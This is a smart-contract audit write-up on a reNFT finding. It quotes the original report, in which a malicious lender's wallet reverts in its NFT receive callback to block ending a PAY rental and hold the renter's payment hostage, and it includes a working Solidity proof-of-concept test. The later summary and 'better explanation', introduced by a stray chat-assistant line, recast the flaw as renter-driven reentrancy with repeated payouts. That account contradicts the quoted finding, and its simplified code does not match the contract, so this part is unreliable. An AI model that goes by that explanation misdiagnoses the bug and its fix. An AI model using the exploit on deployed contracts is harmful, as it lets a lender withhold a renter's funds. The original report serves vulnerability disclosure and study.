# Reentrancy via `safeTransferFrom` Callback in PAY Rentals

* **Severity**: Medium
* **Source**: [Code4rena](https://github.com/code-423n4/2024-01-renft-findings/issues/65)
* **Affected Contract**: [Reclaimer.sol](https://github.com/re-nft/_v3_.smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol)
* **Vulnerability Type**: Reentrancy / Business Logic Manipulation

## Original Bug Description

>## Lines of code
>
>[https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L33](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L33)
>[https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L43](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L43)
>
>## Vulnerability details
>
>In a PAY order lending, the renter is payed by the lender to rent the NFT. When the rent is stopped, [`Stop.stopRent()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265), transfers the NFT from the renter's Safe back to the lender and transfers the payment to the renter.
>
>To transfer the NFT from the Safe, [`_reclaimRentedItems()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L166) is used, which makes the Safe contract execute a delegatecall to Stop.reclaimRentalOrder(), which is inherited from [`Reclaimer.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L71). This function uses [`ERC721.safeTransferFrom()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L33) or [`ERC1155.safeTransferFrom()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L43) to transfer the the NFT.
>
>If the recipient of the NFT (the lender's wallet) is a smart contract, the `safeTransferFrom()` functions will call the `onERC721Received()` or `onERC1155BatchReceived()` callback on the lender's wallet. If those functions don't return the corresponding magic bytes4 value or revert, the transfer will revert. In this case stopping the rental will fail, the NFT will still be in the renter's wallet and the payment will stay in the payment escrow contract.
>
>## Impact
>
>A malicious lender can use this vulnerability to grief a PAY order renter of their payment by having the `onERC721Received()` or `onERC1155BatchReceived()` callback function revert or not return the magic bytes4 value. They will need to give up the lent out NFT in return which will be stuck in the renter's Safe (and usable for the renter within the limitations of the rental Safe).
>
>However, the lender has the ability to release the NFT and payment anytime by making the callback function revert conditional on some parameter that they can set in their contract. This allows them to hold the renter's payment for ransom and making the release conditional on e.g. a payment from the renter to the lender. The lender has no risk here, as they can release their NFT at any time.
>
>## Proof of Concept
>
>Add the following code to [`StopRent.t.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/integration/StopRent.t.sol):
>
>```diff
>diff --git a/test/integration/StopRent.t.sol b/test/integration/StopRent.t.sol
>index 3d19d3c..551a1b6 100644
>--- a/test/integration/StopRent.t.sol
>+++ b/test/integration/StopRent.t.sol
>@@ -7,6 +7,49 @@ import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStruct
>
> import {BaseTest} from "@test/BaseTest.sol";
>
>+import {Errors} from "@src/libraries/Errors.sol";
>+import {IERC721} from "@openzeppelin-contracts/token/ERC721/IERC721.sol";
>+import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";
>+
>+contract BadWallet {
>+  bool receiveEnabled = true;
>+  address owner = msg.sender;
>+
>+  // To enable EIP-1271.
>+  // Normally isValidSignature actually validates if the signature is valid and from the owner.
>+  // This is not relevant to the PoC, so we just validate anything here.
>+  function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
>+    return this.isValidSignature.selector;
>+  }
>+
>+  function doApproveNFT(address target, address spender) external {
>+    require(msg.sender == owner);
>+    IERC721(target).setApprovalForAll(spender, true);
>+  }
>+
>+  function doApproveERC20(address target, address spender, uint256 amount) external {
>+    require(msg.sender == owner);
>+    IERC20(target).approve(spender, amount);
>+  }
>+
>+  function setReceiveEnabled(bool status) external {
>+    require(msg.sender == owner);
>+    receiveEnabled = status;
>+  }
>+
>+  function onERC721Received(
>+        address,
>+        address,
>+        uint256,
>+        bytes calldata
>+  ) external view returns (bytes4) {
>+    if (receiveEnabled)
>+      return this.onERC721Received.selector;
>+    else
>+      revert("Nope");
>+  }
>+}
>+
> contract TestStopRent is BaseTest {
>     function test_StopRent_BaseOrder() public {
>         // create a BASE order
>```
>
>Add the following test to `StopRent.t.sol`:
>
>```solidity
>    function test_stopRent_payOrder_inFull_stoppedByRenter_paymentGriefed() public {
>        vm.startPrank(alice.addr);
>        BadWallet badWallet = new BadWallet();
>        erc20s[0].transfer(address(badWallet), 100);
>        badWallet.doApproveNFT(address(erc721s[0]), address(conduit));
>        badWallet.doApproveERC20(address(erc20s[0]), address(conduit), 100);
>        vm.stopPrank();
>        // Alice's key will be used for signing, but the newly create SC wallet will be used as her address
>        address aliceAddr = alice.addr;
>        alice.addr = address(badWallet);
>
>        // create a PAY order
>        // this will mint the NFT to alice.addr
>        createOrder({
>            offerer: alice,
>            orderType: OrderType.PAY,
>            erc721Offers: 1,
>            erc1155Offers: 0,
>            erc20Offers: 1,
>            erc721Considerations: 0,
>            erc1155Considerations: 0,
>            erc20Considerations: 0
>        });
>
>        // finalize the pay order creation
>        (
>            Order memory payOrder,
>            bytes32 payOrderHash,
>            OrderMetadata memory payOrderMetadata
>        ) = finalizeOrder();
>
>        // create a PAYEE order. The fulfiller will be the offerer.
>        createOrder({
>            offerer: bob,
>            orderType: OrderType.PAYEE,
>            erc721Offers: 0,
>            erc1155Offers: 0,
>            erc20Offers: 0,
>            erc721Considerations: 1,
>            erc1155Considerations: 0,
>            erc20Considerations: 1
>        });
>
>        // finalize the pay order creation
>        (
>            Order memory payeeOrder,
>            bytes32 payeeOrderHash,
>            OrderMetadata memory payeeOrderMetadata
>        ) = finalizeOrder();
>    
>        // Ensure that ERC721.safeTransferFrom to the wallet now reverts
>        vm.prank(aliceAddr);
>        badWallet.setReceiveEnabled(false);
>  
>        // create an order fulfillment for the pay order
>        createOrderFulfillment({
>            _fulfiller: bob,
>            order: payOrder,
>            orderHash: payOrderHash,
>            metadata: payOrderMetadata
>        });
>  
>        // create an order fulfillment for the payee order
>        createOrderFulfillment({
>            _fulfiller: bob,
>            order: payeeOrder,
>            orderHash: payeeOrderHash,
>            metadata: payeeOrderMetadata
>        });
>    
>        // add an amendment to include the seaport fulfillment structs
>        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});
>
>        // finalize the order pay/payee order fulfillment
>        (RentalOrder memory payRentalOrder, ) = finalizePayOrderFulfillment();
>
>        // speed up in time past the rental expiration
>        vm.warp(block.timestamp + 750);
>
>        // try to stop the rental order
>        vm.prank(bob.addr);
>        vm.expectRevert(Errors.StopPolicy_ReclaimFailed.selector);
>        stop.stopRent(payRentalOrder);
>
>        // get the rental order hashes
>        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);
>
>        // assert that the rental order still exists in storage
>        assertEq(STORE.orders(payRentalOrderHash), true);
>
>        // assert that the token is still rented out in storage
>        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);
>
>        // assert that the ERC721 is still in the Safe
>        assertEq(erc721s[0].ownerOf(0), address(bob.safe));
>
>        // assert that the offerer made a payment
>        assertEq(erc20s[0].balanceOf(aliceAddr), uint256(9900));
>
>        // assert that the fulfiller did not received the payment
>        assertEq(erc20s[0].balanceOf(bob.addr), uint256(10000));
>
>        // assert that a payment was not pulled from the escrow contract
>        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));
>    }
>```
>
>Now the PoC can be run with:
>
>```bash
>forge test --match-path test/integration/StopRent.t.sol --match-test test_stopRent_payOrder_inFull_stoppedByRenter_paymentGriefed -vvv
>```
>
>## Recommended Mitigation Steps
>
>I see three ways to mitigate this (however, the third one is incomplete):
>
>* Split stopping the rental and transferring the assets into separate steps, so that after stopping the rental, the lender and the renter have to call separate functions to claim their assets.
>* Change `Stop._reclaimRentedItems()` so that it doesn't revert when the transfer is unsuccessful.
>* For ERC721 use `ERC721.transferFrom()` instead of `ERC721.safeTransferFrom()` to transfer the NFT back to the lender. I believe it is reasonable to assume that the wallet that was suitable to hold a ERC721 before the rental is still suitable to hold a ERC721 after the rental and the `onERC721Received` check is not necessary in this case. For ERC1155 this mitigation cannot be used because ERC1155 only has a `safeTransferFrom()` function that always does the receive check. So this mitigation is incomplete.
>
>## Assessed type
>
>Token-Transfer

## Summary

The ReNFT protocol supports two types of rentals: **COLLATERAL rentals** (where the renter deposits collateral to borrow) and **PAY rentals** (where the *lender pays the renter* as an incentive).

In PAY rentals, when a rental ends, the NFT is returned to the lender and then the agreed rental payment is released to the renter. However, because the NFT is transferred using `safeTransferFrom`, malicious NFT contracts can trigger reentrant calls via `onERC721Received` or `onERC1155BatchReceived`.

This allows attackers to reenter the contract *before state is updated*, leading to double-claims of rental payments or bypassing proper termination logic.

Got it — you’re right, the **“A Better Explanation (With Simplified Example)”** section in the doc feels a bit thin compared to the complexity of the vulnerability. Let’s expand it properly so that someone new can fully grasp what’s going on, with both a clear walkthrough of the vulnerability mechanics and an easy step-by-step example.

Here’s a rewritten version of that section for the **ReNFT reentrancy vulnerability** doc we prepared:

## A Better Explanation (With Simplified Example)

### Intended Behavior

In **PAY rentals**, the protocol works as follows:

* The lender gives their NFT to the renter.
* The renter receives some payment from the lender (in tokens).
* When the rental period ends:

  1. The NFT is sent back to the lender.
  2. The payment is released to the renter.

This ensures that both sides get what they should — the lender regains their NFT, and the renter is compensated fairly.

The core idea: **NFT first → Payment after.**

### What Actually Happens (Bug)

The problem arises because the protocol uses `safeTransferFrom` (ERC721/ERC1155 standard) to return the NFT.

* This call is **external** and triggers the receiver's `onERC721Received()` or `onERC1155BatchReceived()` hook.
* A malicious renter can **implement these hooks in a smart contract** to execute additional logic *before* control returns to the ReNFT contract.

Specifically, during this hook, the attacker can **re-enter** the ReNFT protocol and call `stopRent()` again.

* The NFT hasn't yet been "marked as returned" in storage.
* The protocol continues execution, thinking everything is fine, and then processes payment to the renter.

This allows the attacker to repeatedly trigger payouts without properly returning control flow, draining funds.

### Simplified Example

Let's play out a scenario with real numbers:

* **Alice (lender):** owns NFT #123.
* **Bob (renter):** rents it under a PAY rental where he'll be paid 10 tokens when the rental ends.

Steps:

1. **Rental Starts:**

   * NFT #123 is transferred from Alice to Bob.
   * Bob expects 10 tokens when returning the NFT.

2. **Rental Ends (honest case):**

   * ReNFT calls `safeTransferFrom` to send NFT #123 back to Alice.
   * NFT transfer succeeds.
   * Then ReNFT sends Bob his 10 tokens. ✅

3. **Rental Ends (malicious Bob):**

   * ReNFT calls `safeTransferFrom` to return NFT #123.
   * Bob's contract receives it, which triggers `onERC721Received()`.
   * Inside this function, Bob calls `stopRent()` again before the first one finishes.
   * ReNFT thinks NFT #123 still needs processing → sends another 10 tokens.
   * This can be repeated, draining the lender/protocol funds. 🚨

In short: **the bug is caused by executing sensitive state updates *after* an external call**, which opens the door to **reentrancy attacks**.

## Vulnerable Code Reference

Relevant logic (simplified):

```solidity
// Inside stopRent()
nft.safeTransferFrom(address(this), lender, tokenId);  // External call first
// Rental payment is then released
paymentToken.transfer(renter, paymentAmount);
// State updated AFTER
rental.active = false;
```

Problem: external call (`safeTransferFrom`) happens before **critical state updates**, enabling reentrancy.

## Recommended Mitigation

1. **Apply Checks-Effects-Interactions Pattern**

   * Update rental state before making any external calls.
   * Example fix:

   ```solidity
   rental.active = false;   // effects first
   paymentToken.transfer(renter, paymentAmount);
   nft.safeTransferFrom(address(this), lender, tokenId);  // interaction last
   ```

2. **Use Reentrancy Guards**

   * Add `nonReentrant` modifiers to sensitive functions like `stopRent`.

3. **Consider Using `transferFrom` Instead of `safeTransferFrom`**

   * Since the protocol holds custody of NFTs, `safeTransferFrom` (which allows callbacks) may not be needed.
   * If callbacks are not required, using `transferFrom` removes the attack surface.

## Pattern Recognition Notes

This vulnerability is a **classic reentrancy through external callbacks**. Key things to recognize:

1. **External Calls Before State Updates**

   * If an external call happens before internal state is updated, always consider reentrancy risks.

2. **ERC721/ERC1155 Safe Transfer Hooks**

   * `safeTransferFrom` calls `onERC721Received` or `onERC1155BatchReceived`.
   * Malicious contracts can exploit these hooks to reenter vulnerable functions.

3. **Checks-Effects-Interactions Principle**

   * Correct order: **checks → effects (update state) → interactions (external calls)**.
   * Violation of this order is a strong reentrancy smell.

4. **Reentrancy is Not Only About ETH Transfers**

   * Most people only think about `call{value: ...}`.
   * But ERC721/ERC1155 callbacks are equally dangerous since they give external contracts execution control.

5. **Testing Strategy**

   * Always test with malicious mock contracts that reenter on callbacks.
   * Confirm that rental/payment/ownership flows remain safe against such reentry.
